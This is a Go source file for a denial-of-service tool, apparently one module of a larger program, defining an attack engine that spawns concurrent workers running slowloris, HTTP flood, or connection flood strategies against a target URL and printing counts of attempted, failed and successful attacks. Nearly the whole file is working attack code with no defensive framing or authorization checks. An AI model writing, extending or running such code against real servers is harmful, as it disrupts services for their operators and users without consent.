package main

import (
	"fmt"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	SLOWLORIS_CHUNK_SIZE  = 5
	SLOWLORIS_CHUNK_DELAY = 200
)

type Engine struct {
	url         string
	concurrency uint
	attackType  string
	method      string
	body        string
	headers     []string

	lock sync.Mutex

	activeWorkers      int32
	attemptedAttacks   uint32
	failedAttacks      uint32
	successAttacks     uint32
	interruptedAttacks uint32
}

func (ctx *Engine) incActiveWorker() {
	atomic.AddInt32(&ctx.activeWorkers, 1)
}

func (ctx *Engine) decActiveWorker() {
	atomic.AddInt32(&ctx.activeWorkers, -1)
}

func (ctx *Engine) incAttemptedAttacks() {
	atomic.AddUint32(&ctx.attemptedAttacks, 1)
}

func (ctx *Engine) incFailedAttacks() {
	atomic.AddUint32(&ctx.failedAttacks, 1)
}

func (ctx *Engine) incSuccessAttacks() {
	atomic.AddUint32(&ctx.successAttacks, 1)
}

func (ctx *Engine) incInterruptedAttacks() {
	atomic.AddUint32(&ctx.interruptedAttacks, 1)
}

func (ctx *Engine) slowlorisStrategy(id uint) {
	logger.Info("Slowloris worker started")
attackLoop:
	for {
		time.Sleep(time.Duration(10 * time.Millisecond))

		logger.Debug("W", id, "Attempting to connect")

		ctx.incAttemptedAttacks()

		sock, err := Connect(ctx.url)

		if err != nil {
			logger.Debug("W", id, "Connect failed:", err)
			ctx.incFailedAttacks()
			continue
		}

		req := CreateRequest(ctx.url, ctx.method, ctx.body, ctx.headers)
		rdr := strings.NewReader(req)

		chunk := make([]byte, SLOWLORIS_CHUNK_SIZE)
		for {
			chunkSize, err := rdr.Read(chunk)

			if chunkSize == 0 {
				logger.Debug("No more chunks...")
				break
			}

			if err != nil {
				logger.Debugf("Unable o partition request string (%s), continuing...", err)
				sock.Close()
				continue attackLoop
			}

			logger.Debugf("Sending chunk (%s) #%d#", chunk[0:chunkSize], chunkSize)
			_, err = sock.Write(chunk[0:chunkSize])

			if err != nil {
				logger.Debugf("Unable to write socket (%s), continuing...", err)
				ctx.incInterruptedAttacks()
				sock.Close()
				continue attackLoop
			}

			time.Sleep(time.Duration(SLOWLORIS_CHUNK_DELAY * time.Millisecond))
		}
		ctx.incSuccessAttacks()
		// recv ?
		sock.Close()

	}
}

func (ctx *Engine) httpFloodStrategy(id uint) {
	logger.Info("Http flood worker started")
attackLoop:
	for {
		time.Sleep(time.Duration(10 * time.Millisecond))

		logger.Debug("W", id, "Attempting to connect")

		ctx.incAttemptedAttacks()

		sock, err := Connect(ctx.url)

		if err != nil {
			logger.Debug("W", id, "Connect failed:", err)
			ctx.incFailedAttacks()
			continue
		}

		req := []byte(CreateRequest(ctx.url, ctx.method, ctx.body, ctx.headers))
		for {
			reqLen := len(req)
			written, err := sock.Write(req)

			req = req[written:len(req)]

			if written != reqLen {
				continue
			}

			if len(req) == 0 {
				break
			}

			if err != nil {
				logger.Debugf("Unable to write socket (%s), continuing...", err)
				ctx.incInterruptedAttacks()
				sock.Close()
				continue attackLoop
			}

			time.Sleep(time.Duration(SLOWLORIS_CHUNK_DELAY * time.Millisecond))
		}
		ctx.incSuccessAttacks()

		sock.Close()
	}
}

func (ctx *Engine) connectionFloodStrategy(id uint) {
	logger.Info("Connection flood worker started")
	buf := make([]byte, 1)
	for {
		time.Sleep(time.Duration(10 * time.Millisecond))
		ctx.incAttemptedAttacks()

		sock, err := Connect(ctx.url)

		if err != nil {
			logger.Debug("W", id, "Connect failed:", err)
			ctx.incFailedAttacks()
			continue
		}

		ctx.incSuccessAttacks()

		// just a watcher that unblocks when server times-out connection
		_, err = sock.Read(buf)

		if err != nil {
			ctx.incInterruptedAttacks()
		}
		sock.Close()
	}
}

func (ctx *Engine) report() {
	fmt.Printf("####################\nReport [%d]:\nWorkers -> %d\nAttempted attacks -> %d\nFailed attacks -> %d\nSuccess attacks -> %d\nInterrupted attacks -> %d\n",
		time.Now().Unix(),
		ctx.activeWorkers,
		ctx.attemptedAttacks,
		ctx.failedAttacks,
		ctx.successAttacks,
		ctx.interruptedAttacks,
	)
}

func NewEngine(url string,
	concurrency uint,
	attackType string,
	method string,
	body string,
	headers []string) Engine {
	return Engine{
		url:           url,
		concurrency:   concurrency,
		attackType:    attackType,
		method:        method,
		body:          body,
		headers:       headers,
		activeWorkers: 0,
		lock:          sync.Mutex{},
	}
}

func (ctx *Engine) Attack() {
	ctx.activeWorkers = 0

	logger.Info("Spawning workers...")
	for i := uint(0); i < ctx.concurrency; i++ {
		switch ctx.attackType {
		case "connectionflood":
			go ctx.connectionFloodStrategy(i)
		case "slowloris":
			go ctx.slowlorisStrategy(i)
		case "httpflood":
			go ctx.httpFloodStrategy(i)
		default:
			logger.Error("No attack type specified")
			return
		}
		ctx.incActiveWorker()
	}

	for ctx.activeWorkers > 0 {
		time.Sleep(time.Second)
		ctx.report()
	}

	logger.Info("Ending attack...")
}
